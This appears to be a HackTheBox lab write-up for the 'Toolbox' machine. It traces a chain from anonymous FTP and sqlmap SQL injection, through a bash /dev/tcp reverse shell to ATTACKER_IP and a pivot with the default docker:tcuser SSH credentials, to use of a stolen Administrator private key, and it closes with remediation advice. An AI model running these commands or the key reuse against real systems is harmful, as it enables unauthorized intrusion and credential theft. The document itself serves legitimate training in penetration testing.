@@ -1,0 +1,158 @@
+Toolbox — SQLi → OS shell (Postgres) → container pivot → host SSH → Administrator key → Administrator (Lab)
+
+Date: 2025-10-19
+TL;DR: Anonymous FTP revealed a `docker-toolbox.exe` artifact and the site `admin.megalogistic.com`. I captured the admin login request, used `sqlmap` to exploit a PostgreSQL SQL injection and obtain an OS shell, gained a shell on the container, discovered the user flag under the Postgres directories, pivoted to the host via `docker:tcuser` SSH creds (container gateway), recovered Administrator’s private SSH key from `C:\Users\Administrator\.ssh\id_rsa`, and used that key to SSH in as `Administrator`. All testing was performed on a retired HTB VM in an isolated lab; artifacts are sanitized.
+
+Scope & permission
+
+This assessment was performed on a retired HackTheBox machine in a lab I control. All commands, artifacts and outputs in this public writeup are sanitized. Do not run exploit code or use recovered keys against third-party or production systems.
+
+Environment & notable findings
+
+- Target: `TARGET_IP` (certificate CN: `admin.megalogistic.com`)
+- Services discovered:
+- FTP (21) — FileZilla ftpd — anonymous FTP allowed (file `docker-toolbox.exe` present)
+- HTTPS (443) — Apache/2.4.38 (Debian) — site `admin.megalogistic.com`
+- Windows services (SSH for Windows, SMB/RPC ports, WinRM-ish ports) — indicates mixed/virtualized environment
+- Container evidence: FTP artifact (`docker-toolbox.exe`) and container IPs observed from shells.
+
+Tools used
+
+`nmap`, `ftp` / FTP client, browser + Burp (to capture login POST), `sqlmap`, `nc` (netcat), basic shell utils (`python3 -c`, `pty`), `ssh`. (Private keys and unredacted logs are kept offline.)
+
+Short chain summary
+
+1. `nmap` → anonymous FTP with `docker-toolbox.exe`.
+2. Map host to `admin.megalogistic.com` → capture login POST.
+3. `sqlmap` → confirm PostgreSQL SQLi, enumerate `public.users`, found hashed admin password.
+4. `sqlmap --os-shell` → spawn OS shell and get reverse shell to attacker.
+5. Interactive shell → spawn PTY, find user flag under Postgres directories.
+6. Observe container networking (`CONTAINER_IP` ~ `172.17.0.2`, host at `172.17.0.1`).
+7. SSH to host as `docker` using known `docker-toolbox` creds (`docker:tcuser`) → access `C:\Users`.
+8. Found `C:\Users\Administrator\.ssh\id_rsa`; copied key to attacker (kept private).
+9. After adjusting local permissions, `ssh -i id_rsa administrator@TARGET_IP` succeeded → Administrator access and root flag.
+
+Detailed steps (sanitized, reproducible)
+1) Port scan
+
+nmap -p- -sCV -T4 --open -oA recon --stats-every 5s TARGET_IP
+
+Notes: scan revealed FTP (anonymous allowed), HTTPS (Apache), and Windows ports — an indicator of mixed/virtualized environment.
+
+2) Anonymous FTP & artifact discovery
+
+ftp TARGET_IP
+# login: anonymous
+# password: (blank)
+ls -la
+
+Found: docker-toolbox.exe in the FTP root — a hint at Docker/tooling presence and a pivot opportunity.
+
+3) Map hostname for browsing & capture login
+
+Add host mapping locally to reach the admin portal:
+
+echo "TARGET_IP admin.megalogistic.com" | sudo tee -a /etc/hosts
+
+Use browser+Burp to capture the admin login POST and save it to login.req (for sqlmap).
+
+4) SQLi discovery & enum with sqlmap
+
+Basic discovery and DB enumeration:
+
+sqlmap -r login.req --batch --dbs -o
+
+sqlmap findings (sanitized):
+
+Back-end DBMS: PostgreSQL
+
+Schemas enumerated: information_schema, pg_catalog, public
+
+public contains a users table
+
+List public tables and dump users:
+
+sqlmap -r login.req -D public --tables --batch
+sqlmap -r login.req -D public -T users --dump --batch
+
+Result: users table had one row: username = admin, password = <hashed>.
+
+5) sqlmap OS shell → reverse shell (lab-only)
+
+Using sqlmap’s --os-shell (or --os-pwn) resulted in ability to run OS commands. To get an interactive reverse shell:
+
+On attacker:
+
+nc -lvnp LPORT
+
+In sqlmap’s OS shell:
+
+bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/LPORT 0>&1'
+
+After the connection:
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Result: interactive shell on the database/container host.
+
+6) Locate user flag & observe container network
+
+From the shell:
+
+# search common locations
+cd /var/lib/postgresql
+ls -la
+# found user flag (lab-only)
+cat user.txt
+
+Check network interfaces to find container/host addresses:
+
+ifconfig || ip a
+# saw container IP (e.g., CONTAINER_IP 172.17.0.2) and gateway 172.17.0.1 (host)
+
+7) Pivot to host via known docker-toolbox creds
+
+Documentation/notes for docker-toolbox.exe suggested creds docker:tcuser. From a reachable system (container or attacker machine able to reach container gateway):
+
+ssh docker@172.17.0.1
+# password: tcuser
+
+Result: SSH into the host VM as docker (lab-known credential).
+
+Once on the host, inspect Windows user folders:
+
+# on host (or via mounted/SSHed view)
+ls /c/Users
+ls /c/Users/Administrator/.ssh
+# found id_rsa
+
+8) Retrieve Administrator private key & use it (lab-only)
+
+Copy the id_rsa to your attacker machine securely (out of band / scp). On attacker:
+
+# save id_rsa locally (private archive)
+chmod 605 id_rsa
+ssh -i id_rsa administrator@TARGET_IP
+
+Result: authenticated as Administrator and retrieved root.txt from C:\Users\Administrator\Desktop.
+
+Impact
+
+Full host compromise: SQLi → OS command execution on DB/container → pivot to host → discovery and reuse of Administrator private key → Administrator remote access.
+
+Attackers could exfiltrate data, create persistence, or move laterally.
+
+Remediation (prioritized)
+
+Fix SQL injection: parameterized queries / prepared statements and input validation; disable stacked queries.
+
+Disable anonymous FTP or restrict it to a non-webroot, monitored directory; remove sensitive artifacts like docker-toolbox.exe.
+
+Avoid storing keys or secrets in user directories; implement proper key management and rotate compromised keys.
+
+Segregate containers from host management: do not trust container bridge IPs for host access; enforce network segmentation.
+
+Harden SSH & key permissions; log and alert on new SSH keys or Administrator key usage.
+
+Monitor web uploads and database anomalies; alert on unexpected file writes or SQL error patterns.
+
